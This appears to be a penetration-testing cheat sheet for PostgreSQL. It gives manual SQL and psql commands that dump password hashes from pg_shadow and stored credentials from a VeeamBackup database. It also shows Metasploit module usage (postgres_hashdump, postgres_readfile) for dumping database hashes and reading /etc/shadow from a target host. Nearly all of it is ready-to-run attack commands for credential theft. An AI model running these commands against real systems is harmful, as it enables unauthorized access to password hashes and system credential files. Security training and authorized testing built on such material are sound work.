# PostgreSQL

## 01 - DBMS Hashdump

### 1.1 - Manual

```
postgres=# SELECT username, passwd FROM pg_shadow;
```

```
> psql -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"
```

### 1.2 - Metasploit

```
msf > use auxiliary/scanner/postgres/postgres_hashdump

msf auxiliary(scanner/postgres/postgres_hashdump) > options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as

msf auxiliary(scanner/postgres/postgres_hashdump) > set database <database>

msf auxiliary(scanner/postgres/postgres_hashdump) > run postgres://<username>:<password>@<IP>
```

## 02 - Operating System Hashdump

```
msf > use auxiliary/scanner/postgres/postgres_readfile

msf auxiliary(scanner/postgres/postgres_readfile) > set rfile /etc/shadow

msf auxiliary(scanner/postgres/postgres_readfile) > run postgres://<username>:<password>@<IP>
```